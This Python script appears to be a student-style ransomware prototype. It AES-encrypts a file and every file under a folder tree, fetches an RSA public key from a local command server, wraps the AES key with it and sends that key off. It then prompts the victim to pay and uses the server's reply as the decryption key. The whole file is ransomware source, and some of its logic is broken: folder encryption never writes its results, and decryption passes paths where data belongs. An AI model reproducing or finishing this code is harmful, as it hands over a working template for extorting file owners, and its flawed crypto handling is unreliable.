import requests
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import rsa
import logging




iv = None
def generate_key():
    key_size = 16
    key = Fernet.generate_key()
    key = key[:key_size]
    return key


def encrypt_file(key,file):
    with open(file, 'rb') as f:
        data = f.read()
    
    # Pad the data to a multiple of 16 bytes
    padded_data = data + b"\0" * (16 - len(data) % 16)
    
    # Generate a random 16-byte IV
    iv = os.urandom(16)
    
    # Create an AES cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    
    # Encrypt the data
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    
    return iv, encrypted_data

def decrypt_file(key, iv, encrypted_data):
    # Create a cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    
    # Decrypt the data
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    
    # Unpad the data
    data = padded_data.rstrip(b"\0")
    
    return data

# encrypt all files within folder within the folders within the folder
def encrypt_folder(key, folder):
    for root, dirs, files in os.walk(folder):
        for file in files:
            encrypt_file(key, os.path.join(root, file))

# decrypt all files within folder within the folders within the folder
def decrypt_folder(key, folder):
    for root, dirs, files in os.walk(folder):
        for file in files:
            decrypt_file(key, iv,os.path.join(root, file))



def send_encypted_key(data):
    response = requests.post('http://127.0.0.1:12345/receive_encryptedKey', data={'data': data})
    return response.text

def receive_public_key():
    response = requests.get(' http://127.0.0.1:12345/send_public_key')
    return response.text

def send_payment():
    data= 49856
    response = requests.post(' http://127.0.0.1:12345/payment', data={'data': data})
    print(response.text)
    return response.text


def encrypt_key(key, public_key):
    # convert the public key to an rsa object
    public_key = rsa.PublicKey.load_pkcs1(public_key)
    cipher_rsa = rsa.encrypt(key, public_key)
    return cipher_rsa
if __name__ == "__main__":
    key_original  = generate_key()
    iv,encrypted_file= encrypt_file(key_original,'file.txt')
    # save the encrypted file
    encrypt_folder(key_original, 'random')
    public_key = receive_public_key()
    key_encrypted = encrypt_key(key_original , public_key)
    
    print("Encrypted key:", key_encrypted)
    # convert the encrypted key to string
    key_encrypted = key_encrypted.hex()
    print("Encrypted key:", key_encrypted)
    response = send_encypted_key(key_encrypted )
    # user input
    check = input("Do you want to pay? (y/n)")
    # send payment
    if check == 'y':
        sendingPay = send_payment()
        print("Server Response:", sendingPay)
        # convert sendingPay to bytes
        sendingPay = bytes(sendingPay, 'utf-8')
        # decrypt the file
        file_decrypted = decrypt_file(sendingPay, iv, encrypted_file)
        decrypt_folder(sendingPay, 'random')
        # save the decrypted file
        with open('decrypted_file.txt', 'wb') as f:
            f.write(file_decrypted)
            print("File decrypted!")
        input("Press Enter to exit...")
    else:
        print("Payment not sent")
        input("Press Enter to exit...")

 
    


